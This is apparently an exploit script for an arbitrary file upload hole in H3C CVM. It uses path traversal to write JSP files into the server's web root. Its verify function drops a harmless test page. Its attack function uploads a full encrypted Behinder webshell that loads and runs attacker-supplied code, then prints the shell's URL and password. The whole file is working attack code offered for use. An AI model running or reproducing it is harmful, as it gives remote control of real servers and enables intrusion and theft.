import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': 'H3C CVM 前台任意文件上传漏洞(2022HVV) ',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://mp.weixin.qq.com/s/Oqo-8D6sQltVfq2RfbQdfw',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 5)) + '.jsp'
    payload = '/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{0}&name=222'.format(filename)
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Range': 'bytes 0-10/20',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '{0}'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/cas/js/lib/buttons/' + filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('success', rep.text):
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 5)) + '.jsp'
    payload = '/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{0}&name=222'.format(filename)
    timeout = 20
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Range': 'bytes 0-10/20',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '{0}'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/cas/js/lib/buttons/' + filename)
    print('[+] exploit loading ......')
    time.sleep(2)
    try:
        print('[+] 开始上传webshell')
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200:
            print('[+] 上传成功, 正在检测webshell是否存在?')
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print('[*] status_code: 200 , 上传成功!')
                print('[*] webshell(冰蝎):', verify_url)
                print('[*] 密码: rebeyond')
                return True
        return False
    except:
        return False